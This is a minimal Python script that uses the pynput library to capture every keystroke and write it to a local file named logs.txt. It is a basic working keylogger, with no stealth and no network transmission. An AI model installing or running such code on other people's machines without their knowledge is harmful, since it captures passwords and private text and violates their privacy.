import logging;from pynput.keyboard import Key, Listener
 
logging.basicConfig(filename=("logs.txt"), level=logging.DEBUG, format=" %(message)s")
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()